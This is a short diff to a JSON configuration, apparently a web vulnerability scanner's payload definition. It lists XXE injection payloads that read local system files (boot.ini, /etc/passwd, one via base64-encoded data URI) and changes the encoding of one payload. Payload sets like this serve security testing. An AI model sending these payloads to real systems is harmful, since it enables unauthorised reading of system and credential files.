@@ -5,7 +5,7 @@
 "Payloads":["\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file://c:/boot.ini\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e",
 "\u003c?xml version\u003d\"1.0\" encoding\u003d\"ISO-8859-1\"?\u003e\u003c!DOCTYPE foo [\u003c!ELEMENT foo ANY\u003e\u003c!ENTITY xxe SYSTEM \"file:///etc/passwd\"\u003e]\u003e\u003cfoo\u003e\u0026xee;\u003c/foo\u003e",
 "\u003c!DOCTYPE test [ \u003c!ENTITY % init SYSTEM \"data://text/plain;base64,
-ZmlsZTovLy9ldGMvcGFzc3dk\"\u003e %init; ]\u003e\u003cfoo/\u003e"],
+\n\nZmlsZTovLy9ldGMvcGFzc3dk\"\u003e %init; ]\u003e\u003cfoo/\u003e"],
 "Encoder":[],
 "UrlEncode":false,
 "CharsToUrlEncode":"",
